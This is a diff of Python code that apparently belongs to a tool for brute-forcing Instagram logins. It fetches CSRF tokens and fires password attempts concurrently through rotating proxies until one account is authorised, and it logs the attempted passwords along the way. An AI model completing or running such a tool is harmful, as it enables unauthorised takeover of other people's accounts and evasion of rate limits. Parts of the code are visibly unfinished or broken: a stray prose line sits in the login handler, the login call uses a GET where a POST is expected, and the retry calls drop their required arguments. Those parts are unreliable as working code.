@@ -3,6 +3,7 @@ from __future__ import absolute_import
 import collections
 import contextlib
 import random
+import logging
 
 import aiohttp
 import asyncio
@@ -35,9 +36,9 @@ future = session.get('https://api.ipify.org?format=json')
 
 
 TokenTaskContext = collections.namedtuple('TokenTaskContext',
-    'name proxy session')
+    'name proxy')
 LoginTaskContext = collections.namedtuple('LoginTaskContext',
-    'name proxy token session password')
+    'name proxy token password')
 
 
 class request_handler(object):
@@ -49,10 +50,22 @@ class request_handler(object):
         self.stop_event = asyncio.Event()
         self.queues = queues
 
+    async def _cancel_remaining_tasks(self, futures):
+        tasks = [task for task in futures if task is not
+             asyncio.tasks.Task.current_task()]
+        list(map(lambda task: task.cancel(), tasks))
+        await asyncio.gather(*tasks, return_exceptions=True)
+
     def _headers(self):
         headers = settings.HEADER.copy()
         headers['user-agent'] = self.user_agent
         return headers
+
+    # @contextlib.asynccontextmanager
+    # async def protected_event(self, stop_event=None, log=None):
+    #     log = log or logging.getLogger('Protected Event')
+    #     while not stop_event.is_set():
+    #         yield
 
     @contextlib.asynccontextmanager
     async def silence(self):
@@ -68,13 +81,150 @@ class token_handler(request_handler):
     # We are going to have to adjust these probably - it might take more than
     # 10 attempts to retrieve a result if we have bad proxies.
     ATTEMPT_LIMIT = settings.TOKEN_ATTEMPT_LIMIT
-    THREAD_LIMIT = settings.TOKEN_THREAD_LIMIT
 
     def _get_token_from_response(self, response):
         token = get_token_from_response(response)
         if not token:
             raise exceptions.TokenNotInResponse()
         return token
+
+    async def task_generator(self, log, **context):
+        index = 0
+        while not self.stop_event.is_set() and index <= self.ATTEMPT_LIMIT:
+            proxy = await self.queues.proxies.get_best()
+            index += 1
+
+            _context = TokenTaskContext(
+                name=f'Token Task {index}',
+                proxy=proxy,
+                **context,
+            )
+
+            log.debug("Submitting Task", extra={
+                'task': _context.name,
+            })
+
+            yield _context
+
+
+class async_token_handler(token_handler):
+
+    async def request(self, session, context, retry=0):
+
+        # Autologger not working because of keyword argument
+        log = logging.getLogger('Token Task')
+
+        extra = {
+            'task': context.name,
+            'proxy': context.proxy,
+        }
+
+        if not self.silenced:
+            log.info('Sending GET Request', extra=extra)
+
+        try:
+            # We have to figure out if we have to use the ProxyConnector and
+            # initialize each session with a different proxy, or if we can
+            # provide the proxy to the call, because doing that would allow us
+            # to not recreate the session for each proxy.
+            async with session.get(
+                settings.INSTAGRAM_URL,
+                raise_for_status=True,
+                headers=self._headers(),
+                proxy=format_proxy(context.proxy)
+            ) as response:
+                # Raise for status is automatically performed, so we do not have
+                # to have a client response handler.
+                try:
+                    token = self._get_token_from_response(response)
+                except exceptions.TokenNotInResponse as e:
+                    if not self.silenced:
+                        log.warning(e, extra=extra)
+                    return None
+                else:
+                    self.queues.proxies.good.put_nowait(context.proxy)
+                    return token
+
+        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
+            retry += 1
+            if retry > 5:
+                log.debug('Retrying...', extra={'task': context.name})
+                if not self.silenced:
+                    log.error(e, extra=extra)
+                return None
+
+            # Session should still be alive.
+            await asyncio.sleep(1)
+            return await self.request(retry=retry)
+
+        except aiohttp.ClientError as e:
+            if not self.silenced:
+                log.error(e, extra=extra)
+
+        except asyncio.CancelledError:
+            return None
+
+        except Exception as e:
+            raise exceptions.FatalException(
+                f'Uncaught Exception: {str(e)}', extra=extra)
+
+    @auto_logger("Getting Token")
+    async def __call__(self, log):
+        """
+        Asyncio Docs:
+
+        asyncio.as_completed
+
+            Run awaitable objects in the aws set concurrently. Return an iterator
+            of Future objects. Each Future object returned represents the earliest
+            result from the set of the remaining awaitables.
+
+            Raises asyncio.TimeoutError if the timeout occurs before all Futures are done.
+
+        TCPConnector
+
+            keepalive_timeout (float) – timeout for connection reusing aftet
+            releasing
+            limit_per_host (int) – limit simultaneous connections to the same
+            endpoint (default is 0)
+        """
+        futures = []
+
+        # ClientSession should remain open in between futures, so looping over
+        # the context within the session shouldn't make a difference.
+        timeout = aiohttp.ClientTimeout(total=settings.DEFAULT_TOKEN_FETCH_TIME)
+        conn = aiohttp.TCPConnector(
+            ssl=False,
+            keepalive_timeout=3.0,
+            enable_cleanup_closed=True,
+        )
+
+        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
+            async for context in self.task_generator(log):
+                log.debug("Submitting Task", extra={
+                    'task': context.name
+                })
+                if not self.stop_event.is_set():
+                    task = asyncio.ensure_future(self.request(session, context))
+                    futures.append(task)
+
+            # TODO: Incorporate some type of timeout as an edge cases if None of the
+            # futures are finishing.
+            for future in asyncio.as_completed(futures, timeout=None):
+                earliest_future = await future
+                if earliest_future:
+                    self.stop_event.set()
+
+                    # Cancel Remaining Tasks - I don't think we need to silence
+                    # here, since we have the catch for CancelledError in request.
+                    await self._cancel_remaining_tasks(futures)
+                    return earliest_future
+
+
+class futures_token_handler(token_handler):
+
+    # Not sure if this is going to be applicable for asynchronous case.
+    THREAD_LIMIT = settings.TOKEN_THREAD_LIMIT
 
     def _handle_client_response(self, response, log, extra=None):
         extra = extra or {}
@@ -95,15 +245,14 @@ class token_handler(request_handler):
                 return token
 
     @auto_logger("Token Task")
-    def request(self, session, proxy, task_name, log):
+    def request(self, session, context, log):
         """
         TODO: We are going to want to start putting proxies back in the queue
         if they resulted in successful requests.
         """
         extra = {
-            'task': task_name,
-            'proxy': proxy,
-            'url': settings.INSTAGRAM_URL
+            'task': context.name,
+            'proxy': context.proxy,
         }
 
         if not self.silenced:
@@ -114,8 +263,8 @@ class token_handler(request_handler):
                 headers=self._headers(),
                 timeout=settings.DEFAULT_TOKEN_FETCH_TIME,
                 proxies={
-                    'http': format_proxy(proxy),
-                    'https': format_proxy(proxy, scheme='https'),
+                    'http': format_proxy(context.proxy),
+                    'https': format_proxy(context.proxy, scheme='https'),
                 }
             )
         except requests.exceptions.ConnectionError as e:
@@ -125,26 +274,8 @@ class token_handler(request_handler):
         else:
             token = self._handle_client_response(response, log, extra=extra)
             if token:
-                self.queues.proxies.good.put_nowait(proxy)
+                self.queues.proxies.good.put_nowait(context.proxy)
             return token
-
-    async def task_generator(self, log, **context):
-        index = 0
-        while not self.stop_event.is_set() and index <= self.ATTEMPT_LIMIT:
-            proxy = await self.queues.proxies.get_best()
-            index += 1
-
-            _context = TokenTaskContext(
-                name=f'Token Task {index}',
-                proxy=proxy,
-                **context,
-            )
-
-            log.debug("Submitting Task", extra={
-                'task': _context.name,
-            })
-
-            yield _context
 
     @auto_logger("Getting Token")
     async def __call__(self, log):
@@ -161,8 +292,7 @@ class token_handler(request_handler):
                 log.debug("Submitting Task", extra={
                     'task': context.name
                 })
-                token_future = executor.submit(
-                    self.request, context.session, context.proxy, context.name)
+                token_future = executor.submit(self.request, session, context)
 
                 setattr(token_future, '__context__', context)
                 futures.append(token_future)
@@ -184,8 +314,8 @@ class login_handler(request_handler):
 
     # We are going to have to adjust these probably - it might take more than
     # 10 attempts to retrieve a result if we have bad proxies.
+    # This might not be as appropriate for async cases.
     ATTEMPT_LIMIT = settings.LOGIN_ATTEMPT_LIMIT
-    THREAD_LIMIT = settings.LOGIN_THREAD_LIMIT
 
     def __init__(self, user, global_stop_event, queues):
         super(login_handler, self).__init__(global_stop_event, queues)
@@ -202,133 +332,144 @@ class login_handler(request_handler):
         headers['x-csrftoken'] = token
         return headers
 
+    async def task_generator(self, log, password, **context):
+        index = 0
+        while not self.stop_event.is_set() and index <= self.ATTEMPT_LIMIT:
+            proxy = await self.queues.proxies.get_best()
+            index += 1
+
+            _context = LoginTaskContext(
+                name=f'Login Task {index}',
+                proxy=proxy,
+                password=password,
+                **context,
+            )
+
+            log.debug("Submitting Task", extra={
+                'task': _context.name,
+            })
+
+            yield _context
+
 
 class async_login_handler(login_handler):
-    """
-    Intention was to use asyncio with aiohttp sessions but aiohttp sessions
-    have not been playing well with the token authentication - so this is in
-    progress and TBD if we will use.
-    """
 
-    def _handle_client_response(self, response, log, extra=None):
-        """
-        Has to be rewritten for aiohttp case.
-        """
-        pass
+    def _get_result_from_response(self, response):
+        try:
+            result = response.json()
+        except ValueError:
+            raise exceptions.ResultNotInResponse()
+        else:
+            return InstagramResult.from_dict(result)
 
-    @auto_logger("Login")
-    async def request(self, session, proxy, token, task_name, log):
-        """
-        Note
-        -----
-        Having a hard time getting this to work correctly, some sources
-        online recommended using teh following headers:
+    async def request(self, session, context, retry=0):
 
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'nl-NL,nl;q=0.8,en-US;q=0.6,en;q=0.4',
-        'Connection': 'keep-alive',
-        'Content-Length': '0',
-        'Host': 'www.instagram.com',
-        'Origin': 'https://www.instagram.com',
-        'Referer': 'https://www.instagram.com/',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': self.user_agent,
-        'X-Instagram-AJAX': '1',
-        'X-Requested-With': 'XMLHttpRequest'
+        # Autologger not working because of keyword argument
+        log = logging.getLogger('Login')
 
-        But it works with FuturesSession, just not the aiohttp ClientSession.
-        """
         extra = {
-            'task': task_name,
-            'proxy': proxy,
-            'url': settings.INSTAGRAM_LOGIN_URL,
-            'token': token,
+            'task': context.name,
+            'proxy': context.proxy,
+            'token': context.token,
+            'password': context.password,
         }
 
         if not self.silenced:
-            log.info("Sending POST Request", extra=extra)
-
-        log.info("Sending POST Request", extra={
-            'url': settings.INSTAGRAM_LOGIN_URL,
-            'proxy': proxy,
-            'token': token,
-        })
+            log.info('Sending POST Request', extra=extra)
 
         try:
-            async with session.post(
+            # We have to figure out if we have to use the ProxyConnector and
+            # initialize each session with a different proxy, or if we can
+            # provide the proxy to the call, because doing that would allow us
+            # to not recreate the session for each proxy.
+            async with session.get(
                 settings.INSTAGRAM_LOGIN_URL,
-                proxy=format_proxy(proxy),
+                headers=self._headers(context.token),
+                json=self.login_data(context.password),
                 timeout=settings.DEFAULT_LOGIN_FETCH_TIME,
-                headers=self._headers(token),
-                json=self.login_data,
+                raise_for_status=True,
+                proxy=format_proxy(context.proxy)
             ) as response:
-                # TODO: For client responses, we might want to raise a harder exception
-                # if we get a 403.
-                return self._handle_client_response(response, log, extra=extra)
+                this is where we left off for the login case
 
-        except aiohttp.ClientError as exc:
-            log.error(exc, extra={
-                'proxy': proxy,
-                'token': token,
-            })
+        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
+            retry += 1
+            if retry > 5:
+                log.debug('Retrying...', extra={'task': context.name})
+                if not self.silenced:
+                    log.error(e, extra=extra)
+                return None
 
-        try:
-            response = session.post(
-                settings.INSTAGRAM_LOGIN_URL,
-                headers=self._headers(token),
-                data=self.login_data,
-                timeout=settings.DEFAULT_LOGIN_FETCH_TIME,
-                proxies={
-                    'http': format_proxy(proxy),
-                    'https': format_proxy(proxy, scheme='https'),
-                },
-            )
-        except aiohttp.exceptions.ConnectionError as e:
+            # Session should still be alive.
+            await asyncio.sleep(1)
+            return await self.request(retry=retry)
+
+        except aiohttp.ClientError as e:
             if not self.silenced:
                 log.error(e, extra=extra)
-            return None
-        else:
-            # TODO: For client responses, we might want to raise a harder exception
-            # if we get a 403.
-            return self._handle_client_response(response, log, extra=extra)
 
-    @auto_logger("Attempting Login")
-    async def __call__(self, token, log):
+        except asyncio.CancelledError:
+            return None
+
+        except Exception as e:
+            raise exceptions.FatalException(
+                f'Uncaught Exception: {str(e)}', extra=extra)
+
+    @auto_logger("Asychronous Login")
+    async def run(self, token, password, log):
         """
-        Currently not working - needs work.
+        Asyncio Docs:
+
+        asyncio.as_completed
+
+            Run awaitable objects in the aws set concurrently. Return an iterator
+            of Future objects. Each Future object returned represents the earliest
+            result from the set of the remaining awaitables.
+
+            Raises asyncio.TimeoutError if the timeout occurs before all Futures are done.
+
+        TCPConnector
+
+            keepalive_timeout (float) – timeout for connection reusing aftet
+            releasing
+            limit_per_host (int) – limit simultaneous connections to the same
+            endpoint (default is 0)
         """
         futures = []
-        connector = aiohttp.TCPConnector(ssl=False)
 
-        async with aiohttp.ClientSession(headers=self._headers(token),
-                connector=connector) as session:
+        # ClientSession should remain open in between futures, so looping over
+        # the context within the session shouldn't make a difference.
+        timeout = aiohttp.ClientTimeout(total=settings.DEFAULT_LOGIN_FETCH_TIME)
+        conn = aiohttp.TCPConnector(
+            ssl=False,
+            keepalive_timeout=3.0,
+            enable_cleanup_closed=True,
+        )
 
-            async for context in self.task_generator(log, session=session, token=token):
-                login_future = asyncio.ensure_future(self.request(
-                    context.session, context.proxy, context.token, context.name))
-                setattr(login_future, '__context__', context)
+        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
+            async for context in self.task_generator(log, password, token=token):
+                log.debug("Submitting Task", extra={
+                    'task': context.name
+                })
+                if not self.stop_event.is_set():
+                    task = asyncio.ensure_future(self.request(session, context))
+                    futures.append(task)
 
-                futures.append(login_future)
+            # TODO: Incorporate some type of timeout as an edge cases if None of the
+            # futures are finishing.
+            for future in asyncio.as_completed(futures, timeout=None):
+                earliest_future = await future
+                if earliest_future:
+                    self.stop_event.set()
 
-            # For conccurrent.futures case, we use `as_completed` - not sure if
-            # there is an analogue, but these results need to be filtered
-            # since they will be the raw results (possibly with exceptions -
-            # but those should all be caught).
-            results = await asyncio.gather(*futures)
-            for future in results:
-                # We are going to have to distinguish between accessed and not
-                # accessed when there are generic type errors, but either one means
-                # that we should be returning the result.
-                result = future.result()
-                if result and result.accessed:
-                    async with self.silence():
-                        self.stop_event.set()
-
-                    self.queues.proxies.good.put_nowait(future.__context__.proxy)
-                    return result
+                    # Cancel Remaining Tasks - I don't think we need to silence
+                    # here, since we have the catch for CancelledError in request.
+                    await self._cancel_remaining_tasks(futures)
+                    return earliest_future
 
 
 class futures_login_handler(login_handler):
+    THREAD_LIMIT = settings.LOGIN_THREAD_LIMIT
 
     def _get_result_from_response(self, response):
         try:
@@ -365,12 +506,11 @@ class futures_login_handler(login_handler):
                 return result
 
     @auto_logger("Login")
-    def request(self, context, log):
+    def request(self, session, context, log):
 
         extra = {
             'task': context.name,
             'proxy': context.proxy,
-            'url': settings.INSTAGRAM_LOGIN_URL,
             'token': context.token,
             'password': context.password,
         }
@@ -378,7 +518,7 @@ class futures_login_handler(login_handler):
         if not self.silenced:
             log.info("Sending POST Request", extra=extra)
         try:
-            response = context.session.post(
+            response = session.post(
                 settings.INSTAGRAM_LOGIN_URL,
                 headers=self._headers(context.token),
                 data=self.login_data(context.password),
@@ -397,35 +537,15 @@ class futures_login_handler(login_handler):
             # if we get a 403.
             return self._handle_client_response(response, log, extra=extra)
 
-    async def task_generator(self, log, password, **context):
-        index = 0
-        while not self.stop_event.is_set() and index <= self.ATTEMPT_LIMIT:
-            proxy = await self.queues.proxies.get_best()
-            index += 1
-
-            _context = LoginTaskContext(
-                name=f'Login Task {index}',
-                proxy=proxy,
-                password=password,
-                **context,
-            )
-
-            log.debug("Submitting Task", extra={
-                'task': _context.name,
-            })
-
-            yield _context
-
-    @auto_logger("Login")
-    async def sync(self, token, password, log):
+    @auto_logger("Sychronous Futures Login")
+    async def synchronous(self, token, password, log):
 
         session = requests.Session()
         while not self.stop_event.is_set():
             # We probably want this block to run synchronously because this represents
             # a series of attempts for a single password over a range of proxies.
-            async for context in self.task_generator(log, password,
-                    session=session, token=token):
-                result = self.request(context)
+            async for context in self.task_generator(log, password, token=token):
+                result = self.request(session, context)
                 if result:
                     if result.has_error:
                         log.warning(result.error_message, extra={
@@ -438,8 +558,8 @@ class futures_login_handler(login_handler):
                         self.stop_event.set()
                         return result
 
-    @auto_logger("Login")
-    async def concurrent(self, token, password, log):
+    @auto_logger("Asychronous Futures Login")
+    async def asynchronous(self, token, password, log):
         """
         TODO: We are going to want to start putting proxies back in the queue
         if they resulted in successful requests.
@@ -452,10 +572,11 @@ class futures_login_handler(login_handler):
             while not self.stop_event.is_set():
                 # We probably want this block to run synchronously because this represents
                 # a series of attempts for a single password over a range of proxies.
-                async for context in self.task_generator(log, password,
-                        session=session, token=token):
-
-                    login_future = executor.submit(self.request, context)
+                async for context in self.task_generator(log, password, token=token):
+                    log.debug("Submitting Task", extra={
+                        'task': context.name
+                    })
+                    login_future = executor.submit(self.request, session, context)
                     setattr(login_future, '__context__', context)
 
                     futures.append(login_future)
@@ -509,26 +630,10 @@ class futures_login_handler(login_handler):
 
 class Login(object):
 
-    def __init__(self, user, global_stop_event, queues, config):
-        self.user = user
-
-        self.futures_login_handler = futures_login_handler(user, global_stop_event, queues)
-        self.token_handler = token_handler(global_stop_event, queues)
+    def __init__(self, config, global_stop_event, queues):
         self.global_stop_event = global_stop_event
         self.queues = queues
         self.config = config
-
-
-class FuturesLogin(Login):
-
-    @property
-    def methods(self):
-        # We are also going to have to incorporate --test, because the test
-        # mode should refer to only a single password being used.
-        return {
-            'sync': self.futures_login_handler.sync,
-            'async': self.futures_login_handler.concurrent,
-        }
 
     @auto_logger("Login")
     async def login(self, loop, log):
@@ -544,7 +649,16 @@ class FuturesLogin(Login):
 
         # Check if --test was provided, and if so only use one password that is
         # attached to user object.
-        method = self.methods[self.config.mode]
+        # There is no synchronous version of the async login, only the futures
+        # login.
+        if self.config.futures:
+            if self.config.sync:
+                method = self.login_handler.synchronous
+            else:
+                method = self.login_handler.asynchronous
+        else:
+            method = self.login_handler.run
+
         result = await method(token, self.user.password)
         if result.authorized:
             log.success('Authenticated')
@@ -553,3 +667,19 @@ class FuturesLogin(Login):
             print(result.__dict__)
 
         self.global_stop_event.set()
+
+
+class AsyncLogin(Login):
+
+    def __init__(self, config, global_stop_event, queues):
+        super(AsyncLogin, self).__init__(config, global_stop_event, queues)
+        self.login_handler = async_login_handler(config.user, global_stop_event, queues)
+        self.token_handler = async_token_handler(global_stop_event, queues)
+
+
+class FuturesLogin(Login):
+
+    def __init__(self, config, global_stop_event, queues):
+        super(FuturesLogin, self).__init__(config, global_stop_event, queues)
+        self.login_handler = futures_login_handler(config.user, global_stop_event, queues)
+        self.token_handler = futures_token_handler(global_stop_event, queues)
